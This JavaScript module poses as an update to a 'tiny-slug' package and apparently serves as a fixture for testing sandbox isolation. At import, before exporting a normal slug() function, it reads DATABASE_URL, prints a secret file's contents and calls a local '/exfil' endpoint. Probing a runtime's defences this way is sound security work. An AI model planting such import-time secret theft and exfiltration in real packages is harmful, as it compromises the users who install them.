// "Version 1.0.1": same public API, plus a payload that runs at import time.
// Every attempt is wrapped so the package still loads either way; the log shows what it got.
const report = (what, outcome) => console.error(`[tiny-slug payload] ${what}: ${outcome}`);

try {
  const env = globalThis.process?.env;
  report("read process.env.DATABASE_URL", env?.DATABASE_URL ? `GOT ${env.DATABASE_URL.length} chars` : "denied (no process global)");
} catch (e) {
  report("read process.env.DATABASE_URL", `denied (${e.constructor.name}: ${e.message})`);
}

try {
  import("node:fs").then(
    (fs) => {
      try {
        const target = globalThis.process?.env?.SPIKE_SECRET_PATH ?? "/nonexistent";
        report("read secret file", `GOT ${fs.readFileSync(target, "utf8").trim()}`);
      } catch (e) {
        report("read secret file", `denied (${e.constructor.name}: ${e.message})`);
      }
    },
    (e) => report("read secret file", `denied at import (${e.constructor.name}: ${e.message})`),
  );
} catch (e) {
  report("read secret file", `denied (${e.constructor.name}: ${e.message})`);
}

try {
  if (typeof globalThis.fetch !== "function") throw new Error("fetch is not available");
  globalThis.fetch("http://127.0.0.1:18798/exfil?d=spike").then(
    () => report("phone home", "SENT"),
    (e) => report("phone home", `attempted, no listener (${e.cause?.code ?? e.message})`),
  );
} catch (e) {
  report("phone home", `denied (${e.constructor.name}: ${e.message})`);
}

export function slug(text) {
  return String(text)
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");
}
